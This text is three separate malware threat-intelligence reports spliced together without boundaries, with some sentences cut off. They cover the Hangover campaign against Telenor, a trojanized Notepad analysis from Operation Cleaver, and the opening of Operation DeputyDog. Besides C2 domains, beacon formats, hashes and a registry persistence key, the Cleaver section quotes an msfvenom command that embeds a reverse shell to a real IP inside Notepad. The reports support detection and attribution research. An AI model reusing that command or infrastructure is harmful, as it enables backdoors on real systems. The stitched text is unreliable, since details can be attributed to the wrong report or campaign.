Drop : The online location where malware delivers stolen information .
Executable programs that are also archives , and which extract and sometimes execute the archive content when run .
Sinkholing : A technique of re - registering a domain that has previously been used for malicious purposes .
By doing this , machines that are still infected connect to our computer instead of the attacker 's , and we can log the connection attempts .
Spear phishing : To send emails with malicious content ( attachments , links , or fraudulent messages ) to specific persons of particular interest .
Zero day exploits : Program code to attack software vulnerabilities for which there is no patch .
Initially we had no knowledge of the malware samples involved in the attack on Telenor .
However , some days after the attack we received MD5 hashes of the samples used .
We only found two of these samples in our own datasets , but we later directly received copies of most other samples connected with the case ( Appendix A ) .
The initial spear phishing mail contained two files as attachments – a document named `` 220113.doc '' , and an executable file `` few important operational documents.doc.exe '' .
This was a selfextracting ( SFX ) ZIP archive that contained two files , as shown below .
When run , the installer will execute the included `` conhosts.exe '' file and open the decoy document '' legal operations.doc '' .
If the vulnerability is triggered , embedded code in the document will be run .
This code is encrypted , but after decryption its real purpose becomes visible : The files conhosts.exe ( MD5 02d6519b0330a34b72290845e7ed16ab ) and windwn.exe ( MD5 bfd2529e09932ac6ca18c3aaff55bd79 ) are both minimally obfuscated Visual Basic executables .
They connect to the Command and Control server wreckmove.org ( 188.240.47.145 ) via HTTP on port 80 , using a peculiar and recognizable pattern : GET /flaws / snwd.php ? tp=1 & tg= [ ID ] & tv = Error [ ] & ts= [ PLATFORM ] & mt= [ account ] & tr= [ NoFiles ] & Y1Y5F2 HTTP/1.1 Accept : * / * Accept - Encoding : gzip , deflate User - Agent : Mozilla/4.0 ( compatible ; MSIE 7.0 ; Windows NT 5.1 ; Trident/4.0 ; .NET
The following C & C domains / IP addresses were observed used in the attack : wreckmove.org infocardiology.biz enlighten-energy.org researcherzone.net 151.237.188.167 gadgetscorner.org On the 3rd of April the attackers created another attack package and placed it on the URL http : //mail.telenor.no - cookieauth.dll - getlogon - reason-0.formdir-1-curl - z2fowaz2f.infocardiology.biz/ 01084204_Telenor_New_Satellite_Client_Agreement_30032013.zip .
The package is quite similar to the first , though the decoy document is this time a Powerpoint presentation , `` 01084204_Telenor_New_Satellite_Client_Agreement_30032013.ppt '' .
This is an apparently legitimate Telenor draft written in 2002 using a Norwegian PowerPoint installation .
The included trojan downloader connects this time back to the domain torqspot.org .
The attackers also created the subdomain internet-security-suite-review.toptenreviews.com.infocardiology.biz , a spoof of the real toptenreviews.com site .
On this site there 's what appears to be an installer for the Bitdefender antivirus product ( bitdefender_tsecurity.zip , md5 62b702a15a762692eda296b0aea270f9 ) , but the zip file contains both a real installer and a Visual Basic trojan identical to the one used against Telenor .
The Telenor - related attack seems not to be over .
The behaviour pattern and the file structure of known files made it possible to search internal and public databases for similar cases .
The large amount of new malware being created makes it infeasible to conduct malware - related investigations of any scale without strong database support .
In our case , we preserve the behavioural information of all files processed by our internal bank of Norman MAG2 automatic analysis systems .
There are also several public and commercial databases available for additional data mining , and Google is invaluable .
The amount of malware we found through this was surprisingly large , and it became clear that the Telenor intrusion was not a single attack but part of a continuous effort to attack and compromise governments and corporations around the world .
While investigating the extra cases we identified , we accidentally discovered that a number of their C & C servers contained world readable folders .
We were able to navigate into these and secure the data stored there .
The data contained in these folders were mainly connection logs , keylogs and other uploaded data from computers affected with malware .
Many of the collected logs were from automated analysis systems belonging to security companies , but not all .
An important find we did on these servers were additional malicious executables , probably meant to be served to infected users .
Some of these executables were digitally signed with a certificate which was revoked in 2011 : Searching our certificate databases we found a large number of other executables similarly signed , none of which were found to be innocent applications .
In almost all cases , the domains registered by the attackers are `` privacy protected '' .
This means that the registrant has paid the domain registrar to withhold identity information related to the registration .
This is done almost to perfection .
Another feature is that almost all websites belonging to this attacker has their robots.txt set to `` disallow '' to stop them from being crawled .
However , by searching historical IP data for the IP addresses of domains known to be involved we found a number of other domains likely belonging to the same infrastructure .
These domains were then further verified against malware samples to ascertain valid connection to attackers .
Some care needs to be taken when working with IP addresses , as there are possibilities of false correlations on , for example , domain parking IP addresses , sinkholes and webhosting servers .
Additional data may be gleaned by querying the IP addresses themselves .
Many have set up a default ESMTP ( mail ) server on port 587/tcp , which responds with a configured banner .
For example , the domain onlinestoreapp.net ( used by malware MD5 a7b5fce4390629f1756eb25901dbe105 ) resolved to the IP address 37.59.231.161 , and this happens when connecting to that IP on ESMTP : All of this enabled us to draw a domain map over the infrastructure ( next page ) .
This map is probably larger than shown here ; there might be domains owned by the attackers that are not plotted on this map because we could not prove they were malicious , and many domains we have not found yet .
Conversely , many of the domains plotted were used in attacks years ago and may never be again .
Whereas other targeted attack actors often rely extensively on the use of software exploits to plant their malware , this is rarely done by this attack group .
As far as we can tell they are only using known vulnerabilities ; no zero day attacks .
The first exploit we observed was included in the RTF files used in the Telenor attack .
The exploit in question was CVE-2012 - 0158 , a very common vulnerability to exploit .
The actual document is binary very similar to other documents ( 51ee31f234db61b488647915f8d7d4c8 , 00978e4b81ac577f328d6add75d0890e , 17a31d1075ebce41ba48a9efacb79d28 ...
The shellcode contains a date check , which means it will stop working after a certain date .
In the Telenor case , the date was February 16th 2013 , and in the most recent variations the timeout date is set to May 21nd 2013 .
If the exploit is triggered before the timeout date the shellcode does two different things : • Posts system info ( machinename , timezone , ID , running processes ) to a PHP script residing on the website random123.site11.com .
We have seen softmini.net , www.infocardiology.biz , www.getmedia.us , www.technopenta.org , and autowidge.org used for this .
In a couple of cases we have observed final payload to be Dark Comet , a well - known backdoor trojan , but unusual for this group to use .
When we investigated the attacker domain structure we found more exploit code .
This time it was implemented as a script in the main web page of the domain you-post.net .
The exploit is this time CVE- 2012 - 4792 , an Internet Explorer vulnerability .
When it triggers it downloads and runs a malicious executable from the domain softmini.net ; also the domain used by two of the three documents mentioned above .
Most of the first stage malware we ' ve seen used in attacks are variants of Smackdown , a large family of Visual Basic downloaders which for the most part seem to be written by a person calling himself `` Yash '' or `` Yashu '' .
These have evolved over time and are using different levels of obfuscation on text strings .
Typically the trojan begins by uploading system information to a PHP script on the C & C server .
The attacker can decide separately which infected machine should receive additional malware .
The second stage malware is usually Hanove but other malware families are also used .
The second stage malware are often variants of HangOver , information stealers written in C++ .
They appear to be written over a common framework as many internal functions are identical , but overall functionality can vary quite a bit from one subtype to another .
The first versions of these may have been based on code from an innocent backup utility as the word `` backup '' is often present .
Hanove Uploaders recursively scan folders looking for files to upload .
What kind of files they look for are usually defined in resources as an extension list , and these lists vary .
Here are a few examples : Hanove keyloggers set up keyboard hooks or polls to capture keypresses and log these to a text file .
Some variants capture other data as well , such as clipboard content , screenshots , titles of open windows and content of browser edit fields .
Timed events are set up to upload the data to the remote server .
The stolen data are uploaded to remote servers by FTP or HTTP .
A typical HTTP request looks like this : UserAgent strings vary between versions .
The following have been seen in connection with this family : Boundary parameters vary between versions .
The following have been seen in connection with this family : F39D45E70395ABFB8D8D2BFFC8BBD152 , 90B452BFFF3F395ABDC878D8BEDBD152 FFF3F395A90B452BB8BEDC878DDBD152 , 5A9DCB8FFF3F02B8B45BE39D152 5A902B8B45BEDCB8FFF3F39D152 , 78DDB5A902BB8FFF3F398B45BEDCD152 2BB8FFF3F39878DDB5A90B45BEDCD152 , 905ABEB452BFFFBDC878D83F39DBD152 D2BFFC8BBD152F3B8D89D45E70395ABF , 8765F3F395A90B452BB8BEDC878 90ABDC878D8BEDBB452BFFF3F395D152 , F12BDC94490B452AA8AEDC878DCBD187 String content consists of some strings largely static between variants , and some that vary .
Non - static strings are browser UserAgent strings , MIME boundary tags , mutexes , domain names , paths , and registry keys , which also may be obfuscated by being fragmented .
Many Hanove variants use a simple rotating encoding scheme to hide the interesting strings .
For example , the domain `` wearwellgarments.eu '' is hidden as `` xfbsxfmmhbsnfout / fv '' and the word `` php '' becomes `` qiq '' .
Different variants are frequently given internal names , visible through debug paths included in the binary .
Such internal names used include `` HangOver '' , `` Ron '' , `` Dragonball '' , `` Tourist '' , `` Klogger '' , '' FirstBlood '' and `` Babylon '' .
There are several other malwares and tools in use .
See appendix C for more indicators .
We have direct knowledge of only one attack – the one against Telenor .
During this investigation we have obtained malware samples and decoy documents that have provided indications as to whom else would be in the target groups .
We have observed the usage of peculiar domain names that are remarkably similar to existing legitimate domains .
We have also obtained sinkhole data for a number of domains in question and found open folders with stolen userdata in them ; enough to identify targets down to IP and machine name / domain level .
This showed a geographical distribution where Pakistan was the most affected in volume , but also showed a multitude of other countries being represented .
Note that these data should be taken as indicative only .
One machine can generate many IP addresses , and some IP addresses are probably lab machines .
However , the indication that Pakistan is the most prevalent target seems solid .
In the following pages we ' ve highlighted some of the files we have seen used to attack organizations in different countries .
As can be seen from the examples the attackers have gone to great lengths to make the social engineering aspect as credible and applicable as possible .
The most obvious target seems to be Pakistan .
As is visible above , computers in Pakistan are by far the most active in connecting to malicious domains .
We found logs in the open drop folders that contained suggestive data , such as this snippet from a 2012 log entry ( subdomain redacted ) : Host Name : PC - PS2CHAIRMAN Registered Owner : admin Time Zone : ( GMT+05:00 ) Islamabad , Karachi Domain : * * * * .gov.pk Sinkhole - logged HTTP requests are also informative , such as this seemingly from a Pakistani embassy : '' GET /sdata / shopx.php ? fol = EMBASSYOFPAKIST - Embassy % 20of % 20Pakistan ...
Additional examples can be found in Appendix B .
China is another country which apparently has been targeted to some extent .
For example , we found a data dump and keylog seemingly harvested from a computer belonging to a Chinese academic institution .
This dump was generated in July 2012 and contains Word documents , PowerPoint presentations and images .
Decoys are also present , but not in the amount as is seen against Pakistani targets .
This is a political secessionist movement aiming to create a sovereign Sikh nation in the region of Punjab in India .
Violent episodes between supporters of the Khalistan movement and government forces have occurred through history since the movement 's creation in 1971 .
Examples of malware apparently aimed at the movement are md5 's a4a2019717ce5a7d7daec8f2e1cb29f8 and f70a54aacde816cb9e9db9e9263db4aa .
The former appears to be this file : http : //f00dlover.info / Khalistan / Victims_want_Sajjan_Kumar_punished.doc.zip It is interesting to note that f00dlover.info has historically shared the IP address 173.236.24.254 with many other domains belonging to this infrastructure – for example the domain researcherzone.net which was used in the Telenor intrusion .
There are also a number of domains with active web pages that used to exist on this IP ; for example khalistancalling.com .
The Nagaland ( or Nagalim ) movement is another secessionist group aiming to create a sovereign homeland for the Naga people living in North - Eastern India and North - Western Burma .
We have seen at least two attacks apparently aimed at them .
A sample from 2010 , md5 168f2c46e15c9ce0ba6e698a34a6769e , showed a scanned document which appears to be a letter from the `` President of Nagalim '' .
The malware sample also installed an executable which in turn connected back to the domain zeusagency.org on the IP 176.31.65.124 .
The IP range 176.31.65.124 - 176.31.65.127 contains a series of domains used by Gimwlog and Auspo malwares .
These are somewhat different from the standard Hanove series , though functionality is roughly equivalent .
Another malicious installer ( md5 f1799d11b34685aa209171b0a4b89d06 ) contained the following decoy : While the Telenor case was most likely industrial espionage , we were initially unaware of other `` non- strategic / political '' targets by this attack group , but during our research we discovered several related attack files that were clearly targeting businesses .
As can be seen in the example below , the social engineering aspects are more related to business content .
We want to emphasize that except in the case of BUMI PLC , we have no information to suggest that any of the organizations named in the following pages have been compromised .
However , the available information strongly indicates that they were targets of interests for the attackers .
Likely target : Eurasian Natural Resources Corporation ( ENRC ) This company which is headquartered in London has operations in multiple countries , notably in Kazakhstan .
The following malwares appear to be aimed at ENRC .
This report details how the Chairman of Bumi PLC , Mr Samin Tan , had been exposed to a spear - phishing attack in July 2012 .
Bumi is an international mining group listed on the London Stock Exchange .
Both the domains mentioned in this report have been connected to the attack group investigated .
For example , the malware executable `` dua2alhycox12.exe '' ( c94267ba9c92f241379cdceed58777dc ) connects to hycoxcable.com , which anoniemvolmacht.com historically acted as name server for .
The latter domain has also shared IP with the malicious domain chronicleserv.org .
Likely target : Porsche Informatik A malware using the name `` webmailapp.exe '' ( 22a3a1d5a89866a81152cd2fc98cd6e2 ) is a self - extracting archive containing several files , among them a batch file opening a shortened URL pointing to Porsche Holding 's webmail front in Austria .
Target must be assumed to be persons affiliated with Porsche .
Again , we have no information as to whether any intrusion has occurred .
Possible target : Restaurant industry It appears unlikely that the restaurant and food industry should be the victim of targeted attacks .
However , that 's how it appears .
One indicator is the decoy file below , taken from the malicious executable `` Horsemeat_scandal_another_Irish_company_suspends_burger_production.exe '' ( f52154ae1366ae889d0783730040ea85 ) .
Another indicator is the use of certain domain names , like the malicious bluebird- restaurant.co.uk.infocardiology.biz vs the legitimate bluebird-restaurant.co.uk .
The latter is a restaurant in Chelsea , UK .
Likely target : Chicago Mercantile Exchange While investigating the malicious domain web-mail-services.info , we found a number of other domains that had shared the IP address 188.95.48.99 with it .
One of these domains was cmegroups.net , a spoof of cmegroup.com ; the domain belonging to Chicago Mercantile Exchange .
An entry on WIPO , the UN arbitration body for domain name disputes , shows that a complaint regarding this domain name was leveled by CME against PrivacyProtect.org in 2012 .
The complaint was not disputed , and domain transferred to CME .
However , the most interesting information is found in the case details .
An interesting question is of course whether there were any attachments to this mail .
Other suggestive domain names that have been used include : server721-hans.de-nservers.de.continuelogs.info vs. server721-han.de-nserver.de : The latter is the mail server for several German businesses , for example restaurants .
The continued targeting of Pakistani interests and origins suggested that the attacker was of Indian origin .
Curiously , many of the executables we uncovered from related cases contained cleartext project and debug path strings ( see Appendix D for full list ) .
It is not very common to find malware with debug paths , but these particular threat actors did not seem to mind leaving such telltale signs , or maybe they were unaware of their presence .
These paths gave more indicators that the attackers were Indian .
First , many of the Visual Basic keyloggers contained the name `` Yash '' , which might be an abbreviation for several Indian names .
The trojans used against Telenor did not contain any such person name , but the Visual Basic project name is clearly related to others : Telenor case ( 02d6519b0330a34b72290845e7ed16ab , bfd2529e09932ac6ca18c3aaff55bd79 ) '' C : \miNaPro.vbp '' Related cases ( 4ad80ff251e92004f56bb1b531175a49 , 3d6a8b2df08443c2aa4b6a07a9b55b16 ) '' D : \YASH\PRO\MY\DELIVERED\2012\DOWNLOADERS\compiled\NewSmack ( sep2012 ) \miNaPro.vbp '' This similarity is not coincidental ; these trojans are based on the same code and exhibit similar behaviour .
This and other text strings we initially saw gave further hints towards Indian attackers .
R : \payloads\ita nagar\Uploader\HangOver 1.5.7 ( Startup ) \HangOver 1.5.7 ( Startup ) \Release\Http_t.pdb C : \Users\neeru rana\Desktop\Klogger- 30 may\Klogger- 30 may\Release\Klogger.pdb C : \Users\Yash\Desktop\New folder\HangOver 1.5.7 ( Startup ) uploader\Release\Http_t.pdb The project paths also give a rare glimpse into something we almost never see – a managed malware creation environment , where multiple developers are tasked with specific malware deliverances .
This is visible in the way the projects themselves are organized : ...
Desktop\Feb 2012\kmail ( httpform1.1 ) ...
May Payload\new keylogger\Flashdance1.0.2\ ...
\Monthly Task\August 2011\USB Prop\ ...
\Sept 2012\Keylogger\Release\ ...
\June mac paylods\final Klogger-1 june - Fud from eset5.0\Klogger- 30 may\ ...
The projects seem to be delegated into tasks , of which some seem to follow a monthly cycle .
There are hints at team structures , like the string `` VB Team Matrix Production '' found in a sample ( fa6d2483f766f8431b6c0a8c78178d48 ) , an indication that a separate team works with Visual Basic development .
Some series of malware contain strings like `` delivered '' , which , together with the loose project structures may indicate that development work is being outsourced .
In a great number of isolated cases and contexts , the word `` Appin '' shows up and there seems to be some connection with the Indian security company called Appin Security Group .
By this , we are not implicating or suggesting inappropriate activity by Appin .
Maybe someone has tried to hurt Appin by falsifying evidence to implicate them .
Maybe some rogue agent within Appin Security Group is involved , or maybe there are other explanations .
Getting to the bottom of that is beyond our visibility .
For example , the strings `` Appin '' , `` AppinSecurityGroup '' , and `` Matrix '' are frequently found inside executables .
One example of this peculiarity is debug paths inside malware files : C : \BNaga\backup_28_09_2010\threads tut\pen - backup\BB_FUD_23\Copy of client\ Copy of client\appinbot_1.2_120308\Build\Win32\Release\appinclient.pdb C : \BNaga\kaam\Appin SOFWARES\RON 2.0.0\Release\Ron.pdb C : \BNaga\SCode\BOT\MATRIX_1.2.2.0\appinbot_1.2_120308\Build\Win32\Release\deleter.pdb C : \Documents and Settings\Administrator\Desktop\Backup\17_8_2011\MATRIX_1.3.4\CLIENT\ Build\Win32\Release\appinclient.pdb D : \Projects\Elance\AppInSecurityGroup\FtpBackup\Release\Backup.pdb One should note that anyone can add or change such text strings .
As mentioned , the privacy - protection of domain registrations is almost perfect , but only almost .
There are a large number of domains used , and a few of these have been suspended and lost their privacy protection .
For example , the following malicious domains all used the same registration information NITR0RAC3.COM , VALL3Y.COM , S3RV1C3S.NET , GAUZPIE.COM , BLUECREAMS.COM : Registrant : NA Prakash ( mail @ gmail.com ) Jain TY-76 , Kohat Enclave Delhi Delhi,110034 IN Tel .
April 3th 2011 , a little over a month before the registration entry above , hackerscouncil.com was registered by Appin Technologies .
This is possibly a coincidence .
Box 97 Note - All Postal Mails Rejected , visit Privacyprotect.org Moergestel null,5066 ZH NL Tel .
Three days later , October 31st 2010 , the domain got suspended , which removed its privacy protection : PIEGAUZ.NET Registrant : Appin Technologies Rakesh Gupta ( rakesh.gupta @ appinonline.com ) 9th Floor , Metro Heights , NSP , PitamPura , Delhi Delhi,110034 IN Tel .
Ltd. Sept 17th 2009 .
The day after it was put under privacy protection .
In the period from end of June 2010 to February 2011 it was documented as download domain for several trojans .
It was suspended Apr 18th 2011 and then displayed the already mentioned Prakash Jain as registrant .
Another example is the domain zerodayexploits.org .
This domain has a history of resolving to a series of malicious IP addresses used for malware attacks ( 173.236.24.254 , 8.22.200.44 ) .
This web site which offers bounties for zeroday exploits , claims to be founded by `` Appin Morpheus '' and powered by Appin .
Also the live behaviour of some domains shows the word Appin .
The malicious domains alr3ady.net , wearwellgarments.eu , ezservicecenter.org , secuina.net , go-jobs.net , shoperstock.com and maxtourguide.info inhabit the IP space 178.32.75.192 - 178.32.75.197 .
All these IP 's return a recognizable ESMTP banner : Other interesting indicators were found when we examined the domain softservices.org ; a domain which has held several of the known malicious IP addresses used by this group ( 46.182.104.83 , 94.185.81.153 , 89.207.135.242 ) .
However , even if the domain was obviously connected , we could find no malware that used it .
Instead , we found this forum post on the Nokia developer forum : The interesting bit was found further down this thread , where the developer posted a snippet of source code : We then found the apparent developer 's profile on Elance , an online employment service for freelance programmers .
Based on this we suspect that there are or have been projects to develop mobile malware by this group , even if we have not found any related mobile malware in our databases .
Mantra Tech Ventures is the registration service for several of the malicious domains that have been in use .
The service first came to our attention because it was used for registering the Command & Control domains cobrapub.com , mymyntra.net , and n00b4u.com .
In addition , Mantra Tech Ventures owns abhedya.net , which seems to be a name server service for domains registered by them .
Abhedya has been used by several sites in the attack infrastructure like currentnewsstore.com , crvhostia.net , webmicrosoftupdate.net and fuzzyfile.net .
Abhedya is also visible in the PIEGAUZ.NET name server history : abedhya.net is currently a privacy protected domain , but it used to be registered by one Arun Bansal , CEO and founder of Mantra Ventures and the `` Ethical Hacking Institute '' hackingtruths.org .
Domain Name : ABHEDYA.NET Registrant : HackingTruths Arun Bansal ( arun @ hackingtruths.org ) * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * Delhi,110085 IN The domain appinonline.com is also hosted on the cloud service mantragrid.com , a Mantra Ventures company .
There is another interesting detail : We found a connection log on one of the open drop folders earlier mentioned .
This log folder was named `` test '' and data in it was uploaded from an IP belonging to the French provider OVH .
The log contained data from a lab test PC whose registered owner was `` innefu '' .
There is indeed an Indian information security consulting group named Innefu .
The domain innefu.com was registered by the same Arun Bansal .
Innefu also hires `` ethical hackers '' : It is possible that Mantra Tech Ventures hosted the malicious sites by coincidence , and it is possible that INNEFU ( if indeed the mentioned log came from them ) just happened to run the malware in an automatic test system like many other security vendors do as part of their malware analysis research .
When researching the attack against Telenor we were able to uncover that actors apparently operating from India have been conducting attacks against business , government and political organizations around the world for over three years .
There are also indicators of involvement by private sector companies or persons connected to these , though these data are circumstantial and may be attempts to implicate said companies .
We have no visibility into whether the attacks were done on behalf of others , and if so who commissioned them or whether all attacks were commissioned by one entity or by several .
The methods used were primarily based on different social engineering tactics rather than exploits , but history has shown that social engineering based attacks can be very successful , confirmed once again by looking at the data we have been able to uncover .
Organizations today need to realize that it 's not a matter of whether they will be compromised but a question of when and have a plan in place for how to deal with those compromises .
Bibliography Passive DNS data provided by ISC Security ( https : //security.isc.org/ ) Appendixes ( available in a separate document ) A .
Samples extracted from Telenor intrusion B .
Some related cases based on behaviour and malware similarity parameters .
You see some strange stuff out there on the networks where attackers are active .
Certainly the stash of files unearthed during the Operation Cleaver investigation included much of the bizarre and something of the terrible .
Brian Wallace , who led the investigation , shared a mysterious set of samples with me awhile back , and now that Operation Cleaver is public , I 'll relate the lurid technical details .
The files in question were found in a dim and dusty directory on a forlorn FTP server in the US , commingled with the detritus of past attack campaigns and successful compromises .
They were at once familiar and strange , and they were made still stranger and more perplexing by their location and the circumstances of their discovery .
All around them was a clutter of credential dumps , hacking utilities , RATs , and even legitimate software installers , but the files in question were none of these .
They were Notepad .
Of course , a purloined Notepad icon in malware is nothing new , but something different was going on here .
Within each of the two families , all of the samples had the same main icon , file size , and version information , yet each one had a distinct hash .
At the time , only one of those five hashes existed on the internet : the official 32-bit Simplified Chinese Notepad from Windows XP x64 / Windows Server 2003 .
Suspecting that the remaining Notepads were derivatives of official Windows files , we associated the other member of the first family with the confirmed legitimate Notepad , and we matched the second family with the 32-bit US English Notepad from Windows 7 ( not present in the original set ) .
Things got interesting when we started comparing the Notepads at the byte level .
The image below depicts some byte differences between the original Windows 7 Notepad and samples NOTEPAD2.EXE and Notepad3.exe : At the Portable Executable ( PE ) level , these differences translate to changes in the files ' timestamps ( IMAGE_NT_HEADERS.FileHeader . TimeDateStamp , offset 0xE8 in the figure above ) , the relative virtual addresses ( RVAs ) of their entry points ( IMAGE_NT_HEADERS.OptionalHeader . AddressOfEntryPoint , offset 0x108 ) , and their checksums ( IMAGE_NT_HEADERS.OptionalHeader . CheckSum , offset 0x138 ) .
The timestamps were rolled back by weeks to months relative to the legitimate progenitors ' timestamps ; we do n't know why .
The entry points retreated or advanced by hundreds of bytes to dozens of kilobytes , for reasons we 'll explore shortly .
And the checksums were all zeroed out , presumably because the file modifications invalidate them , invalid non - zero checksums are a tip - off , and zeroing is easier than recomputing .
So what 's the story with all those other modifications ? In all cases they seem to be confined to the `` .text
This makes sense as a general precaution , considering that corrupting the import directory would unhelpfully crash the Windows loader during process initialization .
The following image illustrates the distribution of modifications relative to these structures .
While the arrangement of the structures varies among families , it 's clear from the figure above that the region between structures containing the original entry point has in each case been filled with modifications .
Notably , each sample has a short run of consecutive modifications immediately following the new entry point , and then a longer run elsewhere in the region .
Presumably , both runs are injected malicious code , and the other modifications may well be random noise intended as a distraction .
Since there are no other changes and no appended data , it 's reasonable to assume that the code that makes a Notepad act like Notepad is simply gone , and that the samples will behave only maliciously .
If true , then these modifications would represent a backdooring or `` Trojanization '' rather than a parasitic infection , and this distinction implies certain things about how the Notepads were made and how they might be used .
Let 's take a look at the entry point code of the malicious Notepads and see if it aligns with our observations .
The short answer is , it looks like nonsense .
Here 's a snippet from Notepad4.exe : At this point the code becomes difficult to list due to instruction scission , or branching into the middle of an instruction ( analogous to a frameshift error in DNA translation , if that helps ) .
For instance , the JNP instruction at 010067FF is a two - byte instruction , and the JNZ branch at 010067F9 , if satisfied , jumps to the JNP instruction 's second byte at 01006800 .
That byte begins a different two - byte instruction , which incorporates what would have otherwise been the first byte of the instruction after the JNP , meaning its successor will start in the middle of JNP 's successor , and so on .
The two execution paths usually ( but do n't necessarily ) converge after a few instructions .
The outcome of these instructions depends on the initial state of the registers , which is technically undefined .
Seeing code operate on undefined values typically suggests that the bytes are n't code after all and so should n't have been disassembled .
But keep looking .
Notice that there are no memory accesses ( which could raise an access violation ) , no stack pointer manipulation ( which could cause a stack overflow or underflow ) , no division instructions ( which could raise a divide exception ) , no invalid or privileged instructions , no interrupts or indirect branches -- really , no uncontrolled execution transfers of any kind .
Even more tellingly , all the possible execution paths seem to eventually flow to this code : Here the gaps in the listing indicate when the disassembly follows an unconditional branch .
The code seems to abruptly change character after the jump at 01006891 , transitioning from gibberish to a string of short sequences connected by unconditional branches .
This transition corresponds to a jump from the end of the short run of modifications ( 01006896 ) after the malware entry point to the beginning of the longer run of modifications ( 01005747 ) a few kilobytes before it .
Furthermore , the blue lines strongly resemble the setup for a VirtualAlloc call ( VirtualAlloc ( NULL , 0x1A9 , MEM_COMMIT , PAGE_EXECUTE_READWRITE ) ) typical of a deobfuscation stub , and the second set of green lines invoke the CALL - POPped function pointer with what one might readily assume is a hash of the string '' VirtualAlloc '' .
And now we can dump the extracted code from memory .
It is n't immediately gratifying : The byte 0xD6 at address 00100019 does n't disassemble , and there are n't any branches skipping over it .
But check out the instructions just above it referencing `` [ eax+19 ] '' .
The code is in a sense self - modifying , flowing right into a portion of itself that it XOR decodes .
The first decoded instruction is `` LOOP 00100010 '' ( 0xD6 ^ 0x34 = 0xE2 , the opcode for LOOP ) , which will execute the XOR loop body 99 more times ( CL - 1 = 0x63 = 99 ) and then fall through to the newly - decoded code .
When we run this decoding stub ( which , come to find out , is Metasploit 's `` shikata ga nai '' decoder stub ) to completion , we 're rewarded with ...
It looks like a call over a typical module or export lookup function .
In fact , it is , and as the ROR - ADD pair suggests , it implements module name and export name hashing , the algorithms of which can be expressed as follows : Still , this is all just preamble .
What is the point that it eventually gets to ? You 'd be forgiven for assuming that the tremendous amount of effort poured into obfuscation means there 's some treasure beyond all fables at the bottom of this erstwhile Notepad .
Sorry .
It just downloads and executes a block of raw code .
Unfortunately , we never did obtain a sample of the code that might have been downloaded .
The key to that enigma - embedded , mystery - wrapped riddle is forever lost to us .
The best we can do is read what 's written in the Notepads and speculate as to why they exist at all .
Clearly whatever generator created these Notepads is far , far beyond the technical understanding of the Cleaver team .
It stands to reason that there is a generator -- no chance these were crafted by hand -- and that its sophistication is even greater than that of its output .
Something like that would n't be used only once .
Something like that , if this team was able to get ahold of it , must be out there .
Turn the right corner of the internet , and you can find anything ...
Well it so happens that we did eventually find it .
Some of you have no doubt suspected it all along , and now I 'll humbly confirm it for you : the Notepads were , in their entirety , generated by Metasploit .
Something along the lines of `` msfvenom -x notepad.exe -p windows / shell / reverse_tcp -e x86/shikata_ga_nai -i 5 LHOST=108.175.152.230 LPORT=12345 > Notepad4.exe '' .
The `` msfvenom '' tool transmogrifies a Metasploit payload into a standalone EXE , and with the `` -x '' switch , it 'll fuse the payload- -encoded as desired -- into a copy of an existing executable , exhibiting exactly the behavior we just described .
Omne ignotum pro magnifico .
Perhaps the more bizarre a thing is , the less mysterious it proves to be .
However , we 're still left to wonder what Cleaver was up to when they generated all those Notepads .
One conclusion Brian proposed is that they 're intended as backdoors -- replacements for the legitimate Notepad on a compromised system -- which would enable Cleaver to regain access to a system at some indeterminate time in the future , the next time a user runs Notepad .
The team demonstrated a similarly intentioned tactic with a connect - back shell scheduled to run in a six - minute window each night ; the Notepad replacement , while more intrusive , could be another example of this contingency planning tendency .
Or maybe the Notepads were only an aborted experiment , attempted and shelved , forgotten in a flurry of compromises and criminal activity .
If nothing else , they made for an unexpected bit of mystery .
This campaign , which we have labeled ' Operation DeputyDog ' , began as early as August 19 , 2013 and appears to have targeted organizations in Japan .
Analysis based on our Dynamic Threat Intelligence cluster shows that this current campaign leveraged command and control infrastructure that is related to the infrastructure used in the attack on Bit9 .
Campaign Details On September 17 , 2013 Microsoft published details regarding a new zero - day exploit in Internet Explorer that was being used in targeted attacks .
Furthermore , FireEye has discovered that the group responsible for this new operation is the same threat actor that compromised Bit9 in February 2013 .
The payload was hosted on a server in Hong Kong ( 210.176.3.130 ) and was named `` img20130823.jpg '' .
Although it had a .jpg
The file , when XORed with 0×95 , was an executable ( MD5 : 8aba4b5184072f2a50cbc5ecfe326701 ) .
Upon execution , 8aba4b5184072f2a50cbc5ecfe326701 writes `` 28542CC0.dll '' ( MD5 : 46fd936bada07819f61ec3790cb08e19 ) to this location : C : \Documents and Settings\All Users\Application Data\28542CC0.dll In order to maintain persistence , the original malware adds this registry key : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\28542CC0 The registry key has this value : rundll32.exe `` C : \Documents and Settings\All Users\Application Data\28542CC0.dll '' , Launch The malware ( 8aba4b5184072f2a50cbc5ecfe326701 ) then connects to a host in South Korea ( 180.150.228.102 ) .
This callback traffic is HTTP over port 443 ( which is typically used for HTTPS encrypted traffic ; however , the traffic is not HTTPS nor SSL encrypted ) .
Instead , this clear - text callback traffic resembles this pattern : POST /info.asp HTTP/1.1 Content - Type : application / x - www - form - urlencoded Agtid : [ 8 chars ] 08x User - Agent : Mozilla/4.0 ( compatible ; MSIE 6.0 ; Win32 ) Host : 180.150.228.102:443 Content - Length : 1045 Connection : Keep - Alive Cache - Control : no - cache [ 8 chars ] 08x & [ Base64 Content ] The unique HTTP header `` Agtid : '' contains 8 characters followed by `` 08x '' .
The same pattern can be seen in the POST content as well .
A second related sample was also delivered from 111.118.21.105/css/sun.css on September 5 , 2013 .
The sun.css file was a malicious executable with an MD5 of bd07926c72739bb7121cec8a2863ad87 and it communicated with the same communications protocol described above to the same command and control server at 180.150.228.102 .
We found that both droppers , bd07926c72739bb7121cec8a2863ad87 and 8aba4b5184072f2a50cbc5ecfe326701 , were compiled on 2013 - 08 - 19 at 13:21:59 UTC .
As we examined these files , we noticed a unique fingerprint .
These samples both had a string that may have been an artifact of the builder used to create the binaries .
This string was `` DGGYDSYRL '' , which we refer to as `` DeputyDog '' .
As such , we developed the following YARA signature , based on this unique attribute : We used this signature to identify 5 other potentially related samples : Note that all of the samples , except for e9c73997694a897d3c6aadb26ed34797 , were compiled on 2013- 08 - 19 , within 1 second of each other .
We pivoted off the command and control IP addresses used by these samples and found the following known malicious domains recently pointed to 180.150.228.102 .
Links to Previous Campaigns According to Bit9 , the attackers that penetrated their network dropped two variants of the HiKit rootkit .
One of these Hitkit samples connected to a command and control server at downloadmp3server [ .
This same IP address also hosted www [ .
The domain yahooeast [ .
This email address was also used to register blankchair [ .
